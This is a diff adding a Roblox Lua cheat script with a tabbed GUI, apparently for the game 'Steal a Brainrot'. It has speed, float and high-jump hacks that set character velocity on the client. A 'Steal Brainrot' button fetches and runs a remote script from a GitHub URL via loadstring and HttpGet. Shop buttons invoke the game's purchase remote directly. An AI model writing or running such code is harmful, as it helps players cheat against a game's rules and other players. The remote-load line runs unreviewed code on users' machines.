@@ -1,0 +1,174 @@
+local player = game.Players.LocalPlayer
+local gui = player:WaitForChild("PlayerGui")
+local RS = game:GetService("ReplicatedStorage")
+local UIS = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+
+-- GUI ROOT
+local screenGui = Instance.new("ScreenGui", gui)
+screenGui.Name = "ToolboxMini"
+screenGui.ResetOnSpawn = false
+
+local tabs, currentTab = {}, "Main"
+local boostConn, floatConn, jumpConn
+
+-- 🧰 Toggle Button
+local toggleBtn = Instance.new("TextButton", screenGui)
+toggleBtn.Size = UDim2.new(0, 44, 0, 44)
+toggleBtn.Position = UDim2.new(1, -50, 1, -50)
+toggleBtn.Text = "🧰"
+toggleBtn.Font = Enum.Font.GothamBold
+toggleBtn.TextSize = 20
+toggleBtn.TextColor3 = Color3.new(1,1,1)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 6)
+
+-- GUI FRAME
+local mainFrame = Instance.new("Frame", screenGui)
+mainFrame.Size = UDim2.new(0, 360, 0, 420)
+mainFrame.Position = UDim2.new(0.5, -180, 0.5, -210)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+mainFrame.Visible = false
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
+
+toggleBtn.MouseButton1Click:Connect(function()
+	mainFrame.Visible = not mainFrame.Visible
+end)
+
+-- 🗂️ TAB BAR
+local tabBar = Instance.new("Frame", mainFrame)
+tabBar.Size = UDim2.new(1, 0, 0, 42)
+tabBar.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+Instance.new("UICorner", tabBar).CornerRadius = UDim.new(0, 8)
+
+local function switchTab(name)
+	for tabName, frame in pairs(tabs) do
+		frame.Visible = (tabName == name)
+	end
+	currentTab = name
+end
+
+local function createTabButton(label, posX)
+	local btn = Instance.new("TextButton", tabBar)
+	btn.Size = UDim2.new(0, 80, 0, 32)
+	btn.Position = UDim2.new(0, posX, 0, 5)
+	btn.Text = label
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 14
+	btn.TextColor3 = Color3.new(1, 1, 1)
+	btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+	btn.MouseButton1Click:Connect(function() switchTab(label) end)
+end
+
+createTabButton("Main", 20)
+createTabButton("Powers", 120)
+
+-- 🔧 MAIN TAB
+local mainTab = Instance.new("Frame", mainFrame)
+mainTab.Size = UDim2.new(1, 0, 1, -50)
+mainTab.Position = UDim2.new(0, 0, 0, 50)
+mainTab.BackgroundTransparency = 1
+tabs["Main"] = mainTab
+
+local function addMainButton(text, y, func)
+	local btn = Instance.new("TextButton", mainTab)
+	btn.Size = UDim2.new(0, 300, 0, 40)
+	btn.Position = UDim2.new(0.5, -150, 0, y)
+	btn.Text = text
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 14
+	btn.TextColor3 = Color3.new(1,1,1)
+	btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+	btn.MouseButton1Click:Connect(function() func(btn) end)
+end
+
+-- 🚀 Speed Boost
+addMainButton("🚀 Speed Boost", 60, function(btn)
+	local speed = 50
+	local active = btn.Text == "🚀 Speed Boost"
+	btn.Text = active and "BOOST ENABLED" or "🚀 Speed Boost"
+	btn.BackgroundColor3 = active and Color3.fromRGB(0,170,255) or Color3.fromRGB(45,45,45)
+	if boostConn then boostConn:Disconnect() end
+	if active then
+		boostConn = RunService.Heartbeat:Connect(function()
+			local char = player.Character
+			local hum = char and char:FindFirstChildOfClass("Humanoid")
+			local root = char and char:FindFirstChild("HumanoidRootPart")
+			if hum and root and hum.MoveDirection.Magnitude > 0 then
+				local dir = hum.MoveDirection
+				root.Velocity = Vector3.new(dir.X * speed, root.Velocity.Y, dir.Z * speed)
+			end
+		end)
+	end
+end)
+
+-- 🪂 Float Mode
+addMainButton("🪂 Float Mode", 130, function(btn)
+	local power = 40
+	local active = btn.Text == "🪂 Float Mode"
+	btn.Text = active and "FLOAT ENABLED" or "🪂 Float Mode"
+	btn.BackgroundColor3 = active and Color3.fromRGB(0,170,255) or Color3.fromRGB(45,45,45)
+	if floatConn then floatConn:Disconnect() end
+	if active then
+		floatConn = RunService.Heartbeat:Connect(function()
+			local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+			local dir = workspace.CurrentCamera.CFrame.LookVector
+			if root then
+				root.AssemblyLinearVelocity = Vector3.new(dir.X * power, 4, dir.Z * power)
+			end
+		end)
+	end
+end)
+
+-- 🦘 High Jump
+addMainButton("🦘 High Jump", 200, function(btn)
+	local jump = 120
+	if jumpConn then jumpConn:Disconnect() end
+	jumpConn = UIS.JumpRequest:Connect(function()
+		local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+		if root then root.Velocity = Vector3.new(0, jump, 0) end
+	end)
+	btn.Text = "HIGH JUMP READY"
+	btn.BackgroundColor3 = Color3.fromRGB(0,170,255)
+end)
+
+-- 🧠 Steal Brainrot
+addMainButton("🧠 Steal Brainrot", 270, function(btn)
+	btn.Text = "Loading..."
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Youifpg/Steal-a-Brianrot/refs/heads/main/ArbixHubBEST.lua"))()
+	task.wait(1.5)
+	btn.Text = "🧠 Steal Brainrot"
+end)
+
+-- 💸 POWERS TAB
+local powersTab = Instance.new("Frame", mainFrame)
+powersTab.Size = UDim2.new(1, 0, 1, -50)
+powersTab.Position = UDim2.new(0, 0, 0, 50)
+powersTab.BackgroundTransparency = 1
+powersTab.Visible = false
+tabs["Powers"] = powersTab
+
+local function addPowerButton(text, y)
+	local btn = Instance.new("TextButton", powersTab)
+	btn.Size = UDim2.new(0, 300, 0, 40)
+	btn.Position = UDim2.new(0.5, -150, 0, y)
+	btn.BackgroundColor3 = Color3.fromRGB(60, 30, 30)
+	btn.Text = text
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 14
+	btn.TextColor3 = Color3.new(1, 1, 1)
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+	btn.MouseButton1Click:Connect(function()
+		local remote = RS.Packages.Net["RF/CoinsShopService/RequestBuy"]
+		btn.Text = "Buying..."
+		local ok = pcall(function() remote:InvokeServer(text) end)
+		btn.Text = ok and "✅ " .. text or "❌ Failed"
+		task.delay(1.5, function() btn.Text = text end)
+	end)
+end
+
+addPowerButton("Quantum Cloner", 60)
+addPowerButton("Medusa's Head", 130)
+addPowerButton("Invisibility Cloak", 200)
